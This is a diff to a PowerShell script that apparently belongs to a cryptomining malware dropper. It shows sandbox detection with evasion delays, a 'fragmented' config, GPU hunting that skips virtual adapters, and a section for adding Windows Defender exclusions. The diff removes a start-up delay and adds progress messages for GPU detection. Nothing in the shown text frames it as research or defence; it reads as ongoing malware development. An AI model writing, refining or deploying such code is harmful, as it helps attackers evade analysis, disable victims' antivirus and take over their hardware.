@@ -35,7 +35,7 @@ function Test-Sandbox {
     return $hits -ge 2
 }
 
-Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 7)
+# Initial sleep removed for "Fast Ingest"
 # if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
 
 # === CONFIG (fragmented) ===
@@ -85,10 +85,13 @@ try {
         $n = $vc.Name.ToUpper()
         if ($n -match 'NVIDIA|AMD|RADEON|RTX|GTX|RX\s?\d' -and $vc.AdapterRAM -gt 3GB) {
             if ($n -notmatch 'BASIC|DISPLAY|VIRTUAL') {
-                $hw.gpu = $true; $hw.gpuName = $vc.Name.Trim(); break
+                $hw.gpu = $true; $hw.gpuName = $vc.Name.Trim(); 
+                Write-Host "[+] High-Performance GPU Detected: $($hw.gpuName)"
+                break
             }
         }
     }
+    if (-not $hw.gpu) { Write-Host "[*] No compatible GPU found. Falling back to CPU only." }
 } catch {}
 
 # === DEFENDER EXCLUSION (Direct Admin Attempt) ===
